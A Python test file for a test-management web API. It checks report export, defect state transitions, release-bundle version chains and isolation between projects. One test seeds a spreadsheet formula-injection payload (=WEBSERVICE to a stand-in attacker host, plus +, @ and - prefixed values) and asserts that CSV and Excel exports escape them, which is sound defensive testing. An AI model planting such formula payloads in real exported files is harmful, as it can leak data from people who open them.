"""Batch 59 lifecycle acceptance evidence for J10/J12/J17."""
from __future__ import annotations

from io import BytesIO

from openpyxl import load_workbook

from app.models.audit import AuditLog
from app.models.defect import Defect, DefectTransition
from app.models.release_bundle import ReleaseBundle

from _guard_helpers import assert_guard_404
from app.models.test_report import TestReport as ReportModel
from tests.batch59_factories import seed_case_plan_execution


def test_j10_report_crud_export_and_foreign_access_are_project_scoped(
    client,
    auth_headers,
    admin_user,
    db_session,
    monkeypatch,
) -> None:
    """P0/P1: create/detail/list/export/delete work; foreign plan/detail are rejected."""
    from app.api.v1 import report as report_api

    monkeypatch.setattr(
        report_api,
        "_run_notify_in_new_session",
        lambda *_args, **_kwargs: None,
    )
    own_case, own_plan, own_execution = seed_case_plan_execution(
        db_session,
        project_id=1,
        suffix="REPORT",
        execution_status="fail",
    )
    own_case.title = "=WEBSERVICE(\"https://attacker.invalid\")"
    own_case.domain = "+malicious-domain"
    own_case.module = "@malicious-module"
    own_execution.executor_id = admin_user.id
    own_execution.notes = "-2+3"
    db_session.commit()
    _, foreign_plan, _ = seed_case_plan_execution(
        db_session,
        project_id=2,
        suffix="FOREIGN-REPORT",
    )

    created = client.post(
        "/api/v1/reports",
        json={"plan_id": own_plan.id, "name": "Batch 59 report"},
        headers=auth_headers,
    )
    assert created.status_code == 200
    assert created.json()["code"] == 0
    report_id = created.json()["data"]["id"]

    detail = client.get(f"/api/v1/reports/{report_id}", headers=auth_headers)
    listed = client.get(
        "/api/v1/reports?keyword=Batch%2059&page=1&page_size=1",
        headers=auth_headers,
    )
    exported = client.get(
        f"/api/v1/reports/{report_id}/export?format=csv",
        headers=auth_headers,
    )
    exported_excel = client.get(
        f"/api/v1/reports/{report_id}/export?format=excel",
        headers=auth_headers,
    )

    assert (
        detail.status_code
        == listed.status_code
        == exported.status_code
        == exported_excel.status_code
        == 200
    )
    assert detail.json()["data"]["content"]["stats"]["fail"] == 1
    assert listed.json()["data"]["total"] == 1
    assert listed.json()["data"]["items"][0]["id"] == report_id
    assert exported.headers["content-type"].startswith("text/csv")
    csv_text = exported.content.decode("utf-8-sig")
    assert "'=WEBSERVICE" in csv_text
    assert "'+malicious-domain" in csv_text
    assert "'@malicious-module" in csv_text
    assert "'-2+3" in csv_text
    assert "Admin" in csv_text
    workbook = load_workbook(BytesIO(exported_excel.content), read_only=True)
    assert workbook["概览"]["B10"].value == 1
    assert workbook["用例明细"]["B2"].value.startswith("'=WEBSERVICE")
    assert workbook["用例明细"]["C2"].value == "'+malicious-domain"
    assert workbook["用例明细"]["D2"].value == "'@malicious-module"
    assert workbook["用例明细"]["G2"].value == "fail"
    assert workbook["用例明细"]["H2"].value == "Admin"

    rejected = client.post(
        "/api/v1/reports",
        json={"plan_id": foreign_plan.id, "name": "Foreign report"},
        headers=auth_headers,
    )
    assert rejected.status_code == 200
    assert rejected.json()["code"] == 1

    foreign = ReportModel(
        project_id=2,
        plan_id=foreign_plan.id,
        name="foreign-persisted-report",
    )
    db_session.add(foreign)
    db_session.commit()
    foreign_detail = client.get(f"/api/v1/reports/{foreign.id}", headers=auth_headers)
    assert_guard_404(foreign_detail)

    deleted = client.delete(f"/api/v1/reports/{report_id}", headers=auth_headers)
    assert deleted.status_code == 200
    assert deleted.json()["data"]["deleted"] is True
    assert db_session.get(ReportModel, report_id) is None


def test_j12_defect_state_machine_history_stats_and_illegal_retry(
    client,
    auth_headers,
    db_session,
    monkeypatch,
) -> None:
    """P0/P1: legal transitions persist in order; repeated/foreign transitions do not."""
    from app.api.v1 import defect as defect_api

    monkeypatch.setattr(
        defect_api.ingest_service,
        "ingest_defect_in_new_session",
        lambda *_args, **_kwargs: None,
    )
    created = client.post(
        "/api/v1/defects",
        json={"title": "Batch 59 lifecycle defect", "severity": "P0"},
        headers=auth_headers,
    )
    assert created.status_code == 200
    defect_id = created.json()["data"]["id"]

    for to_status in ("confirmed", "fixing", "pending_review", "closed"):
        response = client.post(
            f"/api/v1/defects/{defect_id}/transition",
            json={"to_status": to_status, "comment": f"Batch59 -> {to_status}"},
            headers=auth_headers,
        )
        assert response.status_code == 200
        assert response.json()["data"]["status"] == to_status

    history = client.get(
        f"/api/v1/defects/{defect_id}/transitions",
        headers=auth_headers,
    )
    stats = client.get("/api/v1/defects/stats", headers=auth_headers)
    assert history.status_code == stats.status_code == 200
    assert [item["to_status"] for item in history.json()["data"]] == [
        "confirmed",
        "fixing",
        "pending_review",
        "closed",
    ]
    assert stats.json()["data"]["total"] == 1
    assert stats.json()["data"]["by_status"] == {"closed": 1}

    illegal = client.post(
        f"/api/v1/defects/{defect_id}/transition",
        json={"to_status": "fixing", "comment": "illegal retry"},
        headers=auth_headers,
    )
    assert illegal.status_code == 200
    assert illegal.json()["code"] == 1

    foreign = Defect(project_id=2, title="foreign defect", creator_id=0)
    db_session.add(foreign)
    db_session.commit()
    foreign_transition = client.post(
        f"/api/v1/defects/{foreign.id}/transition",
        json={"to_status": "confirmed"},
        headers=auth_headers,
    )
    assert_guard_404(foreign_transition)

    db_session.expire_all()
    assert db_session.get(Defect, defect_id).status == "closed"
    assert db_session.query(DefectTransition).filter_by(defect_id=defect_id).count() == 4
    assert db_session.query(AuditLog).filter_by(action="defect:transition").count() == 4


def test_j17_release_bundle_version_chain_crud_and_project_isolation(
    client,
    auth_headers,
    db_session,
) -> None:
    """P0/P1: the version chain stays project-local and CRUD side effects are explicit."""
    parent = client.post(
        "/api/v1/release-bundles",
        json={
            "name": "Batch 58 baseline",
            "client_version": "58",
            "admin_version": "58",
        },
        headers=auth_headers,
    )
    assert parent.status_code == 200
    parent_id = parent.json()["data"]["id"]

    child = client.post(
        "/api/v1/release-bundles",
        json={
            "name": "Batch 59 legacy closure",
            "client_version": "59",
            "admin_version": "59",
            "parent_bundle_id": parent_id,
        },
        headers=auth_headers,
    )
    assert child.status_code == 200
    child_id = child.json()["data"]["id"]

    updated = client.put(
        f"/api/v1/release-bundles/{child_id}",
        json={"status": "active", "description": "legacy debt closure"},
        headers=auth_headers,
    )
    chain = client.get(
        f"/api/v1/release-bundles/{child_id}/version-chain",
        headers=auth_headers,
    )
    listed = client.get(
        "/api/v1/release-bundles?keyword=Batch&page=1&page_size=1",
        headers=auth_headers,
    )

    assert updated.status_code == chain.status_code == listed.status_code == 200
    assert updated.json()["data"]["status"] == "active"
    assert [item["id"] for item in chain.json()["data"]] == [child_id, parent_id]
    assert listed.json()["data"]["total"] == 2
    assert len(listed.json()["data"]["items"]) == 1

    foreign_parent = ReleaseBundle(
        project_id=2,
        name="foreign parent",
        client_version="foreign",
    )
    db_session.add(foreign_parent)
    db_session.commit()
    rejected_parent = client.post(
        "/api/v1/release-bundles",
        json={"name": "invalid child", "parent_bundle_id": foreign_parent.id},
        headers=auth_headers,
    )
    assert rejected_parent.status_code == 200
    assert rejected_parent.json()["code"] == 400

    foreign_detail = client.get(
        f"/api/v1/release-bundles/{foreign_parent.id}",
        headers=auth_headers,
    )
    foreign_update = client.put(
        f"/api/v1/release-bundles/{foreign_parent.id}",
        json={"name": "stolen"},
        headers=auth_headers,
    )
    foreign_delete = client.delete(
        f"/api/v1/release-bundles/{foreign_parent.id}",
        headers=auth_headers,
    )
    assert_guard_404(foreign_detail)
    assert_guard_404(foreign_update)
    assert_guard_404(foreign_delete)

    deleted = client.delete(
        f"/api/v1/release-bundles/{child_id}",
        headers=auth_headers,
    )
    assert deleted.status_code == 200
    assert deleted.json()["data"]["deleted"] is True
    assert db_session.get(ReleaseBundle, child_id) is None
